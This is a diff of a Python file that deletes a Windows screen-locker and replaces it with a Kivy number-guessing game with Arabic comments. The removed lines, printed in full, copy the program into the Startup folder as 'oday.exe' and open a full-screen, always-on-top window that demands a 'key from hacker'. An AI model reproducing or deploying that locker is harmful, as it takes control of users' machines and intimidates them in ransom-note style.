@@ -1,61 +1,133 @@
-import tkinter as tk
-from tkinter import messagebox
-import os
-import sys
-import shutil
-import threading
+# -*- coding: utf-8 -*-
 
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.label import Label
+from kivy.uix.textinput import TextInput
+from kivy.uix.button import Button
+from kivy.uix.popup import Popup
+from kivy.clock import Clock
+from kivy.core.window import Window
+import random
 
-# تحديد مسار التطبيق
-path_app = os.path.abspath(sys.argv[0])
+# دالة للتحقق من إذا كان الرقم أوليًا
+def is_prime(number):
+    if number < 2:
+        return False
+    for i in range(2, int(number ** 0.5) + 1):
+        if number % i == 0:
+            return False
+    return True
 
-# تحديد مجلد البداية في قائمة "ابدأ"
-run_start = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-name = os.path.join(run_start, "oday.exe")
+# دالة للتحقق من إذا كان الرقم مضاعفًا لرقم معين
+def is_multiple(number, multiple):
+    return number % multiple == 0
 
-# إذا لم يكن التطبيق موجودًا في المجلد، قم بنسخه
-if not os.path.exists(name):
-    shutil.copy(path_app, name)
+# واجهة اللعبة
+class GuessNumberGame(BoxLayout):
+    def __init__(self, **kwargs):
+        super(GuessNumberGame, self).__init__(**kwargs)
+        self.orientation = "vertical"
+        self.padding = 20
+        self.spacing = 10
 
-# دالة للخروج من التطبيق
-def exit_app():
-    root.destroy()
+        # تعليمات اللعبة
+        self.label_instruction = Label(text="أدخل تخمينك (بين 1 و 25):", font_size=24, halign="right")
+        self.add_widget(self.label_instruction)
 
-# دالة للتحقق من المفتاح المدخل
-def clos(event=None):
-    key = "1234567"
-    if entry.get() == key:
-        exit_app()
-    else:
-        messagebox.showerror("Don't play with me", "The key is wrong")
+        # حقل إدخال التخمين
+        self.entry_guess = TextInput(multiline=False, font_size=24, halign="right")
+        self.add_widget(self.entry_guess)
 
-# إعداد واجهة المستخدم
-root = tk.Tk()
+        # زر التخمين
+        self.button_guess = Button(text="تخمين", font_size=24, background_color=(0.3, 0.7, 0.3, 1))
+        self.button_guess.bind(on_press=self.check_guess)
+        self.add_widget(self.button_guess)
 
-# إخفاء إطار النافذة
-root.overrideredirect(True)
-root.attributes("-topmost", True)
+        # نتيجة التخمين
+        self.label_result = Label(text="", font_size=24, halign="right")
+        self.add_widget(self.label_result)
 
-# إضافة النصوص والعناصر
-tk.Label(root, text="Enter the key from hacker:", bg="green", fg="black").pack()
+        # زر إعادة التشغيل
+        self.button_restart = Button(text="إعادة التشغيل", font_size=24, background_color=(0, 0.5, 0.8, 1))
+        self.button_restart.bind(on_press=self.restart_game)
+        self.add_widget(self.button_restart)
 
-entry = tk.Entry(root, width=50, border=0)
-entry.pack(pady=20)
+        # بدء اللعبة
+        self.restart_game()
 
-b = tk.Button(root, text="Submit", command=clos)
-b.pack()
+    # بدء اللعبة
+    def restart_game(self, *args):
+        self.secret_number = random.randint(1, 25)
+        self.attempts = 0
+        self.label_result.text = "مرحبًا! لقد اخترت رقمًا بين 1 و 25. هل يمكنك تخمينه؟"
+        self.entry_guess.text = ""
 
-root.config(background="green")
-root.resizable(False, False)
+    # التحقق من التخمين
+    def check_guess(self, *args):
+        guess = self.entry_guess.text
 
-# جعل نافذة التطبيق تغطي الشاشة بالكامل
-root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
-root.title("Keno")
+        if not guess.isdigit():
+            self.show_popup("خطأ", "من فضلك أدخل رقمًا صحيحًا!")
+            return
 
-tk.Label(root, text="hack@gmail.com", bg="green", fg="black").pack(pady=20)
+        guess = int(guess)
+        self.attempts += 1
 
-# استدعاء الدالة clos عند الضغط على Enter أو الزر Submit
-entry.bind("<Return>", clos)
+        if guess < self.secret_number:
+            self.label_result.text = "الرقم الذي تخمنه أقل من الرقم الصحيح. حاول مرة أخرى!"
+        elif guess > self.secret_number:
+            self.label_result.text = "الرقم الذي تخمنه أعلى من الرقم الصحيح. حاول مرة أخرى!"
+        else:
+            self.show_popup("مبروك!", f"لقد خمنت الرقم الصحيح ({self.secret_number}) في {self.attempts} محاولة!")
+            self.restart_game()
+            return
 
-# تشغيل نافذة tkinter
-root.mainloop()
+        # إعطاء تلميحات إضافية
+        if self.attempts == 2:
+            if self.secret_number > 10:
+                self.label_result.text = "تلميح: الرقم الصحيح أكبر من 10."
+            else:
+                self.label_result.text = "تلميح: الرقم الصحيح أقل من أو يساوي 10."
+        elif self.attempts == 3:
+            if self.secret_number % 2 == 0:
+                self.label_result.text = "تلميح: الرقم الصحيح هو رقم زوجي."
+            else:
+                self.label_result.text = "تلميح: الرقم الصحيح هو رقم فردي."
+        elif self.attempts == 5:
+            if is_prime(self.secret_number):
+                self.label_result.text = "تلميح: الرقم الصحيح هو رقم أولي."
+            else:
+                self.label_result.text = "تلميح: الرقم الصحيح هو رقم غير أولي."
+        elif self.attempts == 7:
+            if is_multiple(self.secret_number, 3):
+                self.label_result.text = "تلميح: الرقم الصحيح مضاعف للرقم 3."
+            elif is_multiple(self.secret_number, 5):
+                self.label_result.text = "تلميح: الرقم الصحيح مضاعف للرقم 5."
+            else:
+                self.label_result.text = "تلميح: الرقم الصحيح ليس مضاعفًا لـ 3 أو 5."
+        elif self.attempts == 9:
+            if self.secret_number > 15:
+                self.label_result.text = "تلميح: الرقم الصحيح أكبر من 15."
+            else:
+                self.label_result.text = "تلميح: الرقم الصحيح أقل من أو يساوي 15."
+
+        # إذا انتهت المحاولات
+        if self.attempts >= 10:
+            self.show_popup("خسرت!", f"للأسف، لقد خسرت! الرقم الصحيح كان: {self.secret_number}.")
+            self.restart_game()
+
+    # عرض نافذة منبثقة
+    def show_popup(self, title, message):
+        popup = Popup(title=title, content=Label(text=message, font_size=24), size_hint=(0.8, 0.4))
+        popup.open()
+
+# تطبيق Kivy
+class GuessNumberApp(App):
+    def build(self):
+        Window.clearcolor = (0.94, 0.94, 0.94, 1)  # لون الخلفية
+        return GuessNumberGame()
+
+# تشغيل التطبيق
+if __name__ == "__main__":
+    GuessNumberApp().run()
